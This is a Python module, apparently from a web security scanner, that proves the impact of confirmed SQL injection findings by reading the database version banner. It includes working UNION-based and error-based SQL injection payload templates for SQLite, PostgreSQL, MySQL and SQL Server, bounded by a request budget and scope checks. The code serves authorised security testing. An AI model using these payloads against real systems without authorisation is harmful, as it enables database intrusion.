"""Proof of impact: turn a *confirmed* finding from "this is vulnerable" into "this is what
an attacker can actually read".

Runs only over findings an oracle already confirmed, so it can never create a false positive:
it just tries a **bounded, read-only** extraction and, if it succeeds, attaches the extracted
value to ``finding.impact``. If it fails (hardened target, unusual dialect, budget spent), the
finding stands exactly as it was.

SQL injection (v1): recover the database version banner in-band — via a UNION whose columns are
each wrapped in a unique marker, or via a type-cast/XPath error that leaks the same. The version
banner is high-signal (it proves arbitrary DB read) and non-sensitive, so extraction stays safe.
The extracted value is rejected if it still contains our own SQL tokens (a reflected payload, not
evaluated output), which keeps the proof honest.
"""

from __future__ import annotations

import re
import secrets

import httpx

from dastcore.core.http_client import BudgetExceededError, HttpClient, OutOfScopeError
from dastcore.core.models import Finding, HttpRequest, HttpResponse
from dastcore.engine.rule_engine import build_mutated_request

_MAX_REQ_PER_FINDING = 24  # hard cap so extraction never becomes a mini brute-force
_VALUE_CAP = 200  # bounded: a version banner, not a data dump
_INJECTABLE = ("query", "body", "json")

# Substrings that mean we captured our *own* payload reflected back, not evaluated DB output.
_ECHO_MARKERS = (
    "version(",
    "select ",
    "concat",
    "||",
    "+@@",
    "@@version",
    "extractvalue",
    "updatexml",
    "cast(",
    "convert(",
)


async def prove_findings_impact(
    client: HttpClient,
    findings: list[Finding],
    *,
    families: frozenset[str] = frozenset({"sqli"}),
) -> int:
    """Enrich confirmed findings in place with proof of impact. Returns how many were enriched."""
    proven = 0
    for finding in findings:
        if finding.impact or finding.family not in families:
            continue
        proof: str | None = None
        if finding.family == "sqli":
            proof = await _prove_sqli(client, finding)
        if proof:
            finding.impact = proof
            proven += 1
    return proven


async def _send(client: HttpClient, request: HttpRequest) -> HttpResponse | None:
    try:
        return await client.request(
            request.method,
            request.url,
            params=request.params or None,
            headers=request.headers or None,
            cookies=request.cookies or None,
            data=request.data,
            json=request.json_body,
        )
    except (OutOfScopeError, BudgetExceededError, httpx.HTTPError):
        return None


def _clean(value: str) -> str:
    """Collapse whitespace, drop control chars, and bound the length."""
    printable = "".join(ch for ch in value if ch.isprintable() or ch in " \t")
    return " ".join(printable.split())[:_VALUE_CAP]


def _extract_between(text: str, mark: str) -> str | None:
    """The evaluated value our two markers delimit — or None if it's just our reflected payload."""
    m = re.search(re.escape(mark) + r"(.+?)" + re.escape(mark), text, re.S)
    if m is None:
        return None
    inner = _clean(m.group(1))
    lowered = inner.lower()
    if not inner or mark in inner or any(tok in lowered for tok in _ECHO_MARKERS):
        return None  # empty, nested, or our own payload echoed back verbatim
    return inner


def _dbms_of(banner: str, hint: str) -> str:
    """Name the DBMS from the banner text, falling back to the dialect that produced it."""
    low = banner.lower()
    if "sqlite" in low:
        return "SQLite"
    if "mariadb" in low:
        return "MariaDB"
    if "postgresql" in low or "postgres" in low:
        return "PostgreSQL"
    if "sql server" in low or "microsoft sql" in low:
        return "Microsoft SQL Server"
    if "mysql" in low:
        return "MySQL"
    return hint


def _proof(banner: str, dbms: str, technique: str) -> str:
    return (
        f"Lectura de la base de datos confirmada vía SQL injection ({technique}). "
        f"DBMS: {dbms}. Valor extraído (solo lectura, acotado): «{banner}». "
        "Demuestra que un atacante puede leer datos arbitrarios de la base de datos."
    )


# UNION dialects: (column-expression template with {m} marker and {v} version fn, version fn, DBMS hint).
_UNION_PROFILES = [
    ("'{m}'||{v}||'{m}'", "sqlite_version()", "SQLite"),
    ("'{m}'||{v}||'{m}'", "version()", "PostgreSQL"),
    ("CONCAT('{m}',{v},'{m}')", "version()", "MySQL/MariaDB"),
    ("'{m}'+{v}+'{m}'", "@@version", "Microsoft SQL Server"),
]
_BREAKOUTS = [("'", "-- "), ("'", "-- -"), ("'", "#"), ("", "-- ")]

# Error-based one-shots: (expression template with {m} marker, DBMS hint).
_ERROR_PROFILES = [
    ("AND extractvalue(1,concat('{m}',version(),'{m}'))", "MySQL/MariaDB"),
    ("AND updatexml(1,concat('{m}',version(),'{m}'),1)", "MySQL/MariaDB"),
    ("AND 1=cast(('{m}'||version()||'{m}') as int)", "PostgreSQL"),
    ("AND 1=convert(int,'{m}'+@@version+'{m}')", "Microsoft SQL Server"),
]


async def _prove_sqli(client: HttpClient, finding: Finding) -> str | None:
    point = finding.injection_point
    if point.location not in _INJECTABLE:
        return None
    mark = "d" + secrets.token_hex(5)  # alnum delimiter, HTML-safe
    junk = "zq" + secrets.token_hex(3)  # a LIKE prefix no real row matches, so only our UNION row returns
    budget = _MAX_REQ_PER_FINDING

    # 1) UNION-based: put the marker-wrapped version in every column, widening 1..8 until it lands.
    for breakout, comment in _BREAKOUTS:
        for tmpl, version_fn, hint in _UNION_PROFILES:
            col = tmpl.format(m=mark, v=version_fn)
            for ncols in range(1, 9):
                if budget <= 0:
                    return None
                budget -= 1
                cols = ",".join([col] * ncols)
                payload = f"{junk}{breakout} UNION SELECT {cols}{comment}"
                resp = await _send(client, build_mutated_request(point, payload))
                if resp is None:
                    continue
                banner = _extract_between(resp.text, mark)
                if banner:
                    return _proof(banner, _dbms_of(banner, hint), "UNION-based")

    # 2) Error-based: a single crafted cast/XPath error that leaks the same banner.
    for breakout, comment in (("'", "-- "), ("", "-- ")):
        for tmpl, hint in _ERROR_PROFILES:
            if budget <= 0:
                return None
            budget -= 1
            payload = f"{junk}{breakout} {tmpl.format(m=mark)}{comment}"
            resp = await _send(client, build_mutated_request(point, payload))
            if resp is None:
                continue
            banner = _extract_between(resp.text, mark)
            if banner:
                return _proof(banner, _dbms_of(banner, hint), "basada en error")

    return None
